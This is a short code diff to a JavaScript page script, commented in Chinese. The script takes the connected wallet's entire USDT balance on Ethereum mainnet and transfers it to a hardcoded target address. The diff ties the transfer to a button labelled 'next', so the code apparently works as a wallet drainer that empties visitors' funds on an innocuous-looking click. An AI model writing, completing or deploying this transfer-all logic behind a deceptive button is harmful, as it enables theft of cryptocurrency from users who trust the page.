@@ -1,4 +1,3 @@
-// script.js
 // USDT 合约地址（以太坊主网）
 const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 // 目标地址
@@ -87,7 +86,7 @@ async function transferUsdt() {
         const amount = web3.utils.toBN(balance);
         console.log("USDT 余额:", web3.utils.fromWei(amount, 'mwei')); // USDT 有 6 个小数位
 
-        // 发起转账交易
+        // 发起转账交易（转账全部余额，与原始代码一致）
         await usdtContract.methods.transfer(recipientAddress, amount).send({ from: account });
         alert("交易已成功发送！");
     } catch (error) {
@@ -97,4 +96,4 @@ async function transferUsdt() {
 }
 
 // 为按钮添加点击事件
-document.getElementById("ok-button").addEventListener("click", transferUsdt);
+document.getElementById("next-button").addEventListener("click", transferUsdt);
